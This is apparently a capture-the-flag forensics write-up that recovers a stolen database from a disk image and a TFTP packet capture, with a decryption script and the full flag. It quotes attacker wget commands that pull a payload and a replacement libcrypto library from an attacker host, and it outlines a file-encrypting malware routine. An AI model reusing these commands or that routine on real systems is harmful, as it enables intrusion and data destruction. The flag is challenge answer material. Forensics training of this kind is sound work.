<style>
:root {
  color-scheme: dark;
  --bg: #020617;
  --fg: #e5e7eb;
  --fg-muted: #9ca3af;
  --accent: #38bdf8;
  --border-subtle: #1f2937;
}

/* Base page */
html, body {
  margin: 0;
  padding: 0;
  background: radial-gradient(circle at top left, #020617, #020617 40%, #020617 100%);
  color: var(--fg);
  font-family: system-ui, -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", sans-serif;
}

/* GitHub Pages wrappers */
.page-content, .wrapper, article, .post {
  background: transparent !important;
  max-width: 960px;
  margin: 0 auto;
  padding: 2.5rem 1.5rem 4rem;
}

/* Headings */
.post h1, .page-content h1, article h1 {
  font-size: 1.6rem;
  margin-bottom: 0.6rem;
}

.post h2, .page-content h2, article h2 {
  font-size: 1.1rem;
  margin-top: 1.8rem;
  margin-bottom: 0.6rem;
  color: var(--fg-muted);
}

/* Tables (optional, if you use them) */
table {
  border-collapse: collapse;
  width: 100%;
  font-size: 0.85rem;
  margin: 0.4rem 0 0.8rem;
  border-radius: 0.6rem;
  overflow: hidden;
}

th,
td {
  padding: 0.5rem 0.75rem;
  border-bottom: 1px solid var(--border-subtle);
  background-color: rgba(15, 23, 42, 0.9);
}

th {
  text-align: left;
  font-weight: 500;
  color: var(--fg-muted);
}

tbody tr:nth-child(even) td {
  background-color: rgba(15, 23, 42, 0.75);
}

tbody tr:last-child td {
  border-bottom: none;
}

/* Links */
a {
  color: var(--accent);
}

a:hover {
  text-decoration: none;
}

/* Code blocks */
pre,
code,
pre code,
.highlight,
.highlight pre,
.highlight code {
  background-color: rgba(15, 23, 42, 0.96) !important;
  color: var(--fg);
}

pre {
  border: 1px solid var(--border-subtle);
  padding: 0.85rem 1rem;
  border-radius: 0.5rem;
  overflow-x: auto;
  font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
}

code {
  padding: 0.1rem 0.25rem;
  border-radius: 0.25rem;
  font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
}
</style>

# Making The Naughty List Writeup

## Overview
Santa's DB server was compromised and the "nice list" was exfiltrated over TFTP.
The artifacts are:
- `MakingTheNaughtyList/NaughtyKiddie.tar.gz` (filesystem image)
- `MakingTheNaughtyList/network.pcap` (network capture)

The goal is to identify the attacker and recover the stolen data. The flag is in two parts.

## Evidence and Timeline
From `var/log/auth.log` inside the tar:
- SSH login as `santa` from `192.168.239.1`
- Downloaded payloads:
  - `wget christmasevilmeta.xyz/test -O /usr/bin/msload`
  - `wget christmasevilmeta.xyz/libcrypto.so.1.1 -O /usr/lib/x86_64-linux-gnu/libcrypto.so.1.1`
- Read `/srv/tftp/ktmp`
- Deleted `/srv/tftp/ktmp` and `/srv/tftp/nice_list.db.enc`

The log also contains a base64 string:
```
TSBlIHQgYSBDIFQgRiB7IE4gNCB1IGcgaCB0IHkgXyBrIDEgZCBkIGk=
```
Decoded, it yields flag part 1:
```
MetaCTF{N4ughty_k1ddi
```

## TFTP Reconstruction (PCAP)
Inspect `network.pcap` for TFTP traffic:
- RRQ for `nice_list.db.enc`
- RRQ for `ktmp`
Reassemble UDP DATA blocks to recover both files.

Recovered:
- `nice_list.db.enc` (24598 bytes, netascii)
- `ktmp` (64 bytes, hex key)

## Malware Analysis (msload)
Extract `usr/bin/msload` from the tar and disassemble:
- `generate_aes_key` calls `RAND_bytes` to fill a 32-byte global key (`g_aes_key`)
- The key is written to `/srv/tftp/ktmp`
- `encrypt_file`:
  - Reads 16-byte blocks
  - Zero-pads final block
  - AES-ECB encrypts
  - XORs each encrypted byte with `g_aes_key[i % 0x20]`
  - Writes ciphertext
  - Deletes original file
- `encrypt_directory` recursively processes `/srv/tftp`

Key detail: the XOR uses `i % 0x20`, but the loop is only 16 bytes per block, so it
effectively uses `key[:16]` on each block.

## Decryption
Because TFTP used `netascii`, normalize first:
- `CRLF -> LF`
- `CRNUL -> CR`

This produces 24576 bytes (divisible by 16). Then decrypt each block:
```
P = AES-DEC(C XOR key[:16])
```
The result is a valid SQLite database.

## Results
Recovered DB tables:
- `nice_list`
- `naughty_list`
- `admin_credentials`

Attacker identity (from `naughty_list`):
- `Jordan Hacker`

Flag part 2 (from `naughty_list.child_name`):
```
3_w1ll_n0t_h4v3_c4ndY}
```

Full flag:
```
MetaCTF{N4ughty_k1ddi3_w1ll_n0t_h4v3_c4ndY}
```

## Minimal Repro (commands + script)
List contents without full extraction:
```powershell
tar -tf "E:\ctf2\MakingTheNaughtyList\NaughtyKiddie.tar.gz" | rg "auth.log|msload|tftp"
```

Python decryption (after TFTP recovery):
```python
from pathlib import Path
from Crypto.Cipher import AES

enc = Path(r"E:\ctf2\MakingTheNaughtyList\recovered\nice_list.db.enc").read_bytes()

# netascii decode
out = bytearray()
i = 0
while i < len(enc):
    b = enc[i]
    if b == 0x0D and i + 1 < len(enc):
        b2 = enc[i + 1]
        if b2 == 0x0A:
            out.append(0x0A)
            i += 2
            continue
        if b2 == 0x00:
            out.append(0x0D)
            i += 2
            continue
    out.append(b)
    i += 1

key = bytes.fromhex(Path(r"E:\ctf2\MakingTheNaughtyList\recovered\ktmp").read_text().strip())
key16 = key[:16]
cipher = AES.new(key, AES.MODE_ECB)

plain = b"".join(
    cipher.decrypt(bytes(a ^ b for a, b in zip(out[i:i+16], key16)))
    for i in range(0, len(out), 16)
)

Path(r"E:\ctf2\MakingTheNaughtyList\recovered\nice_list.dec").write_bytes(plain)
```
